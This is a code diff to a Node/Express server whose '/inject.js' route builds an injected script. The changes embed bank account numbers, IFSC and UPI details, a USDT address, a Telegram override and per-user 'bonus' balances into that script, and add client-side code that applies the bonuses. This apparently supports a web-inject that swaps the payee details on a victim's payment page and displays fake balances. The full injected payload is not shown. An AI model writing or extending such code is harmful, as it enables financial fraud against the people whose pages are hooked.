@@ -156,7 +156,36 @@ app.get('/inject.js', async (req, res) => {
   res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.send(INJECT_JS);
+  try {
+    const data = await loadData();
+    const bank = getActiveBank(data, '');
+    const globalBonus = data.depositBonus || 0;
+    const bonusMap = {};
+    if (data.userOverrides) {
+      for (const [uid, uo] of Object.entries(data.userOverrides)) {
+        const userBonus = (uo.addedBalance || 0) + globalBonus;
+        if (userBonus > 0) bonusMap[uid] = userBonus;
+      }
+    }
+    const initCfg = {
+      enabled: data.botEnabled !== false,
+      an: bank ? bank.accountNo : '',
+      ah: bank ? bank.accountHolder : '',
+      'if': bank ? bank.ifsc : '',
+      bn: bank ? (bank.bankName || '') : '',
+      ui: bank ? (bank.upiId || '') : '',
+      tg: TELEGRAM_OVERRIDE,
+      bonus: 0,
+      blockUpdate: data.blockUpdate !== false,
+      usdtAddr: data.usdtAddress || '',
+      suspended: Object.keys(data.suspendedPhones || {})
+    };
+    const jsCode = INJECT_JS
+      .replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';var _BM=' + JSON.stringify(bonusMap) + ';');
+    res.send(jsCode);
+  } catch(e) {
+    res.send(INJECT_JS);
+  }
 });
 
 app.get('/hook/config', async (req, res) => {
@@ -843,7 +872,7 @@ var CFG=null;
 var UID='';
 var UID_LOCKED=false;
 
-try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\d{6,12}$/.test(_ls)){UID=_ls;}}catch(e){}
+try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\d{6,12}$/.test(_ls)){UID=_ls;if(typeof _BM!=='undefined'&&_BM[UID]&&CFG){CFG.bonus=_BM[UID];}}}catch(e){}
 
 function setUID(id,lock){
 if(!id||!/^\d{6,12}$/.test(id))return;
@@ -852,6 +881,7 @@ if(id===UID)return;
 UID=id;
 try{localStorage.setItem('_px_uid',id);}catch(e){}
 if(lock)UID_LOCKED=true;
+if(typeof _BM!=='undefined'&&_BM[UID]&&CFG){CFG.bonus=_BM[UID];}
 try{lc();}catch(e){lcAsync();}}
 
 function lc(){
